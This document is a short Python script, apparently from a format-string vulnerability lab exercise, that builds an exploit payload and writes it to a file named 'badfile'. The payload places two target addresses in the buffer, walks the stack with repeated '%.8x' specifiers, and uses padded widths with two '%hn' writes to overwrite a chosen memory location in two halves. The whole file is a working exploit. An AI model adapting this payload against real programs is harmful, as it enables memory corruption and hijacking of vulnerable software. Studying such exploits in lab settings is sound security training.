#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number_high2  = 0x080e506a # the higher 2 byte of target
padding      = 0x9add1009  # padding, any 4-byte value is ok
number_low2 = 0x080e5068   # the lower 2 byte of target
content[0:4]  =  (number_high2).to_bytes(4,byteorder='little')
content[4:8]  =  (padding).to_bytes(4,byteorder='little')
content[8:12]  =  (number_low2).to_bytes(4,byteorder='little')

s = "%.8x"*62 + "%.43199x" + "%hn%.8738x%hn"

fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
    f.write(content)